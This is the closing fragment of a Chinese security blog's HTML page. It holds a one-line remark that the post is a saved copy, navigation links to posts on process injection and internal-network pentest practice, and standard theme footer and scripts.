<p>由于担心师傅更换域名或其他原因搜不到该文章，所以做了一份copy。</p>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/07/09/Process-Injection/" rel="prev" title="Process-Inject-壹">
                  <i class="fa fa-angle-left"></i> Process-Inject-壹
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/08/30/internal-pentest-1/" rel="next" title="内网练习案例-1">
                  内网练习案例-1 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Y0ng</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  





</body>
</html>
